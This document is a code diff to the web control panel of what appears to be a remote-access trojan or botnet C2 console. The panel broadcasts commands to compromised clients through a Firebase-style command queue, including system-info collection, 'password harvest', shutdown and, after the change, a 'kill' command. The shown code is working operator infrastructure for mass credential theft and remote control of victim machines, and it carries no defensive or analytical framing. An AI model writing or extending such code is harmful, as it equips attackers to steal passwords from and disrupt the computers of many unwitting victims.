@@ -188,7 +188,7 @@ body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%
       <button class="btn btn-ghost" onclick="broadcastSystemInfo()">SysInfo All</button>
       <button class="btn btn-ghost" onclick="broadcastPasswords()">Passwords All</button>
       <button class="btn btn-danger" onclick="broadcastShutdown()">Shutdown All</button>
-      <button class="btn btn-danger" onclick="broadcastClose()">Close All</button>
+      <button class="btn btn-danger" onclick="broadcastKill()">Kill All</button>
     </div>
     <div id="bcResult" style="margin-top:.8rem;font-size:.78rem;color:var(--text2)"></div>
   </div>
@@ -544,14 +544,14 @@ async function broadcastPasswords(){
   }
   toast('Password harvest sent to '+sent+' clients');
 }
-async function broadcastClose(){
-  if(!confirm('Close ALL online clients?'))return;
+async function broadcastKill(){
+  if(!confirm('Kill ALL online clients?'))return;
   const target=document.getElementById('bcTarget').value;let sent=0;
   for(const c of g_clients){
     if(target==='online'){const age=c.ts?Date.now()-new Date(c.ts).getTime():1/0;if(age>=60000)continue;}
-    try{await fetch(FB+'/commands/'+fbEsc(c.name)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'close',payload:'',status:'pending'})});sent++}catch{}
+    try{await fetch(FB+'/commands/'+fbEsc(c.name)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'kill',payload:'',status:'pending'})});sent++}catch{}
   }
-  toast('Close sent to '+sent+' clients');
+  toast('Kill sent to '+sent+' clients');
 }
 // Preset commands
 function presetCmd(type,payload){
